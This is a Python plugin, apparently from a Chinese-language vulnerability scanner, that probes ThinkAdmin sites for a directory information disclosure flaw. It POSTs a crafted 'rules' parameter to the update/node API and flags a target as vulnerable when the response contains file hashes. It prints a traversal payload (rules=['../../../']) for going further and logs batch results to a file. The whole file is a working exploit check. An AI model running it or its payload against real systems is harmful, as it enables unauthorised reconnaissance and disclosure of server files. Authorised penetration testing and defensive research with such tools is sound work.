##! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()

class ThinkAdmin_Dir_Info_Scan:
    def get_url(self,input_url):
        try:
            url = input_url + "/admin.html?s=admin/api.Update/node"
            data = "rules=%5B%22.%2F%22%5D"
            req = requests.post(url,headers=self.headers,proxies=self.proxy,verify=self.ssl,data=data)
            if "hash" in req.text:
                OutPrintInfoSuc("ThinkAdmin", f'目标存在ThinkAdmin目录信息漏洞: {url}')
                if not self.batch:
                    OutPrintInfo("ThinkAdmin", '可通过post添加rules=["../../../"]进行目录穿越')
                else:
                    OutPutFile("thinkadmin_dir_info.txt",f'目标存在ThinkAdmin目录信息漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("ThinkAdmin", f'目标不存在ThinkAdmin目录信息漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("ThinkAdmin",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("ThinkAdmin", '开始检测ThinkAdmin目录信息漏洞...')
        self.get_url(url)
        if not self.batch:
            OutPrintInfo("ThinkAdmin", 'ThinkAdmin目录信息漏洞检测结束')

